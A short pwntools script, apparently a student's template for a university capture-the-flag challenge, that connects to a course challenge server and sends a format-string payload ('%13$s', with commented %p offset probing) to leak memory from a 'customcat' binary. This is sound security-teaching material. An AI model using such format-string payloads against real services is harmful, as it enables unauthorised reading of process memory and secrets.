# pwntools is a very powerful library for doing exploitation
from pwn import *

# TODO: Update with actual values
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 2779
BINARY = "./customcat"

r = remote(HOST, PORT)  # to open a connection to the remote service, aka the challenge
# r = process(BINARY)   # use process instead of remote to execute the local version of the program
pause()

PAYLOAD = b'%13$s'

# TODO: Fill in your payload
# i = 13
# for j in range(i, i+4):
  # PAYLOAD += b'%' + str(j).encode('ascii') + b'$p.'
  
r.sendline(PAYLOAD)


# earlier, the script helps us send/receive data to/from the service
# with interactive, we can directly interact with the service
r.interactive()